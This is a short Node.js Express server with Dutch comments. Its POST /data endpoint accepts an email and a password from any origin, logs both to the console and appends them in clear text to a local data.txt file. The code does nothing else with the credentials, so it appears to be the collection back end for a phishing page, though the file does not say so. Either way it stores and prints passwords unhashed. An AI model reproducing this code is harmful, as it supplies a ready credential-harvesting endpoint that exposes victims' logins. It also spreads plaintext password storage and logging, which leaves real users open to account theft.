const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const fs = require("fs");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());

// Pad naar bestand
const filePath = path.join(__dirname, "data.txt"); // plain text bestand

// Zorg dat het bestand bestaat
if (!fs.existsSync(filePath)) {
  fs.writeFileSync(filePath, "");
}

app.post("/data", (req, res) => {
  const { email, password } = req.body;

  // Format string
  const entry = `Email: ${email}\nWachtwoord: ${password}\n---\n`;

  // Log naar console
  console.log(entry);

  // Append naar bestand
  fs.appendFileSync(filePath, entry);

  res.json({ message: "Data ontvangen en opgeslagen!" });
});

app.listen(PORT, () => {
  console.log(`Server draait op poort ${PORT}`);
});
